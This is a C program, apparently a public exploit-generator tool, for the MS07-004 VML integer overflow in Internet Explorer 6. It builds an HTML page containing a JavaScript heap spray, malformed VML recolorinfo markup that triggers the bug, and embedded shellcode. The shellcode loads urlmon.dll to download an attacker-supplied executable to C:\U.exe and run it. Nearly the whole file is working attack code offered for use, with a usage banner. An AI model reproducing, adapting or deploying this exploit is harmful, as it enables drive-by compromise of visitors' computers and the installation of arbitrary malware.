/*
*  Edited by : MMSJ
*	Mail: asmanmmsj@yahoo.com
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

FILE *fp = NULL;
char *file = "MMSJ.html";
char *url = NULL;

unsigned char sc[] =     
"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03"
"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74"
"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"
"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03"
"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C"
"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"
"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C"
"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC"
"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"
"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB"
"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83"
"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"
"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF";

char * header =
"<!--\n"
"\n"
"MS07-004 VML integer overflow exploit\n"
"  by asmanmmsj[at]yahoo.com\n"
"\n"
"- tested on WinXP SP2 English version(fully patched 2007-01-05)  & IE 6.0\n"
"\n"
"- 2007-1-18\n"
"\n"
"-->\n"
"\n"
"\n"	
"<html xmlns:v=\"urn:schemas-microsoft-com:vml\">\n"
"<head>\n"
"<object id=\"VMLRender\"\n"
"classid=\"CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E\">\n"
"</object>\n"
"<style>\n"
"v\\:* { behavior: url(#VMLRender); }\n"
"</style>\n"
"</head>\n"
"<body>\n"
"<SCRIPT language=\"javascript\">\n"
"shellcode =\n"
"unescape(\"%u9090\"+\"%u9090\"+ \n";

char * footer =
"bigblock = unescape(\"%u0505%u0505\");\n"
"headersize = 20;\n"
"slackspace = headersize+shellcode.length;\n"
"while (bigblock.length<slackspace) bigblock+=bigblock;\n"
"fillblock = bigblock.substring(0, slackspace);\n"
"block = bigblock.substring(0, bigblock.length-slackspace);\n"
"while(block.length+slackspace<0x40000) block = block+block+fillblock;\n"
"memory = new Array();\n"
"for (i=0;i<350;i++) memory[i] = block + shellcode;\n"
"</script>\n"
"<v:rect style='width:120pt;height:80pt' fillcolor=\"red\" >\n"
"<v:recolorinfo recolorstate=\"t\" numcolors=\"97612895\">\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\"\n"
"lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\"\n"
"fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>\n"
"<v/recolorinfo>\n"
"</html>\n";





void PrintPayLoad(char *lpBuff, int buffsize)
{
   int i;
   for(i=0;i<buffsize;i+=2)
   {
       if((i%16)==0)
       {
           if(i!=0)
           {
               printf("\"\n\"");
               fprintf(fp, "%s", "\" +\n\"");
           }
           else
           {
               printf("\"");
               fprintf(fp, "%s", "\"");
           }
       }

       printf("%%u%0.4x",((unsigned short*)lpBuff)[i/2]);

       fprintf(fp, "%%u%0.4x",((unsigned short*)lpBuff)[i/2]);
     }


       printf("\";\n");
       fprintf(fp, "%s", "\");\n");


   fflush(fp);
}

void main(int argc, char **argv)
{
   unsigned char buf[1024] = {0};

   int sc_len = 0;


   if (argc < 2)
   {
   	   
      printf("MS Internet Explorer VML Integer Overflow Exploit (MS07-004) \n");
      printf("Coded by MMSJ for Iranian \n");
      printf("Email:asmanmmsj@yahoo.com\n");
      printf("\r\nUsage: %s <exe_URL> [htmlfile]\r\n\n", argv[0]);
      exit(1);
   }

   url = argv[1];


    if( (!strstr(url, "http://") &&  !strstr(url, "ftp://")) || strlen(url) < 10)
    {
        printf("[-] Invalid url. Must start with 'http://','ftp://'\n");
        return;
    }

      printf("[+] download url:%s\n", url);

      if(argc >=3) file = argv[2];
      printf("[+] exploit file:%s\n", file);

   fp = fopen(file, "w");
   if(!fp)
   {
       printf("[-] Open file error!\n");
          return;
   }

   fprintf(fp, "%s", header);
   fflush(fp);

   memset(buf, 0, sizeof(buf));
   sc_len = sizeof(sc)-1;
   memcpy(buf, sc, sc_len);
   memcpy(buf+sc_len, url, strlen(url));

   sc_len += strlen(url)+1;
   PrintPayLoad(buf, sc_len);

   fprintf(fp, "%s", footer);
   fflush(fp);

   printf("[+] exploit write to %s success!\n", file);
}